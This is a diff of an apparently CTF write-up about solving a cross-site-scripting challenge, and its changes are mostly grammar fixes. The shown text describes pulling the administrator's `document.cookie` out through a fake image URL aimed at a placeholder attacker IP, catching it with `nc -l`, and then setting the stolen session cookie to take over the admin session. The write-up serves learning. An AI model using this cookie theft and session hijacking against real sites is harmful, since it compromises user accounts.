@@ -37,19 +37,19 @@ Trying to post something leads to the message:
     Your post was submitted for review. Administator will take a look shortly. 
 
 Well, if *administrator* will open and look on every owr post, then it 
-is Cross-Site-Scripting (XSS) problem for sure, and all what we need is 
+is Cross-Site-Scripting (XSS) task for sure, and all what we need is 
 to send some specially crafted message that will do some useful thing 
 being *looked* (*opened* in web browser) by Administrator. Basically it 
 is a text that contains javascript. This javascript will be executed by 
 Administrator's browser and hence have access to some interesting data 
 like cookies. For example, we can enforce Administrator's browser to 
 try to load image from other site and embed in URL value of 
-`document.cookie`. There will be no image at that URL, but it will too 
-late, the request with data already will be captured.
+`document.cookie`. There will be no image at that URL, but it will be 
+too late, the request with data already will be captured.
 But how can we see this request? One way is to open listening tcp 
-socket (`nc -l 12345`) and crafting URL to fake image like 
+socket (`nc -l 12345`) and to craft URL to fake image like 
 `"http://<our-external-ip>:12345/img.png?cookie="+document.cookie` and 
-see the request in terminal. But what if we have no external IP, or 
+to see the request in terminal. But what if we have no external IP, or 
 have connection via uncontrolled strict firewall or just do not want to 
 open our port for incoming connections?
 There is good web service for this situation that I saw on other's 
@@ -96,11 +96,11 @@ And the flag is
 **CTF{8aaa2f34b392b415601804c2f5f0f24e}**
 
 What if we take Admin's session key? It can be done in different ways 
-depending on your browser. For me the simpliest thing was to open 
-Firefox's WebConsole and just write to it:
+depending on your browser. For me the simplest thing was to open 
+Firefox's WebConsole and just to write to it:
 
     document.cookie="session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV"
 
-Then click to the link "Admin".
+Then click on the link "Admin".
 Nothing interesting, just the same flag in plain text. But at least 
 we tried...
